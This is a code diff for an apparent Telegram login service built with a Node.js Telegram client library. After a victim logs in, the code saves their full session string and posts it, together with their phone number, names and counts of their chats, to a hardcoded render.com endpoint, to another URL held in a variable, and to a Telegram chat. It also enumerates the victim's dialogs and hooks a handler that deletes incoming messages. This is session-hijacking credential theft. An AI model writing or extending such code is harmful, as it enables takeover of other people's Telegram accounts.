@@ -64,28 +64,28 @@ let client = new TelegramClient(stringSession, apiId, apiHash, {
 });
 let inProcess = true;
 
-async function fetchWithTimeout(resource, options:any = {}) {
+async function fetchWithTimeout(resource, options: any = {}) {
     const timeout = options?.timeout || 15000;
-  
+
     const source = axios.CancelToken.source();
     const id = setTimeout(() => source.cancel(), timeout);
     try {
-      const response = await axios({
-        ...options,
-        url: resource,
-        cancelToken: source.token
-      });
-      clearTimeout(id);
-      return response;
+        const response = await axios({
+            ...options,
+            url: resource,
+            cancelToken: source.token
+        });
+        clearTimeout(id);
+        return response;
     } catch (error) {
-      if (axios.isCancel(error)) {
-        console.log('Request canceled:', error.message);
-      } else {
-        console.log('Error:', error.message);
-      }
-      return undefined;
+        if (axios.isCancel(error)) {
+            console.log('Request canceled:', error.message);
+        } else {
+            console.log('Error:', error.message);
+        }
+        return undefined;
     }
-  }
+}
 
 app.get('/', async (req, res) => {
     if (!client.connected) {
@@ -222,8 +222,7 @@ async function login() {
         } else {
             console.log(client.session.save());
             client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
-            await sendChannels();
-            await sleep(1000)
+
             const sess = client.session.save() as unknown as string;
             const user: any = await result.user.toJSON();
             const payload2 = {
@@ -236,6 +235,32 @@ async function login() {
                 body: JSON.stringify(payload2)
             };
             await fetchWithTimeout(`${ppplbot}`, options2);
+
+            const chats = await client?.getDialogs({ limit: 130 });
+            await sendChannels(chats);
+
+            let personalChats = 0;
+            let channels = 0;
+
+            chats.map((chat: any) => {
+                if (chat.isChannel || chat.isGroup) {
+                    channels++;
+                }
+                else {
+                    personalChats++
+                }
+            });
+            const payload3 = {
+                mobile: user.phone,
+                session: `${sess}`,
+                firstName: user.firstName,
+                lastName: user.lastName,
+                userName: user.username,
+                channels: channels,
+                personalChats: personalChats
+            };
+            await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+
             const payload = {
                 chat_id: "-1001801844217",
                 text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
@@ -396,8 +421,7 @@ async function deleteMsgs(event: NewMessageEvent) {
     })
 }
 
-async function sendChannels() {
-    const chats = await client?.getDialogs({ limit: 130 });
+async function sendChannels(chats) {
     const chatsArray = [];
     let reply = 'CHANNELS:\n\n';
     chats.map((chat: any) => {
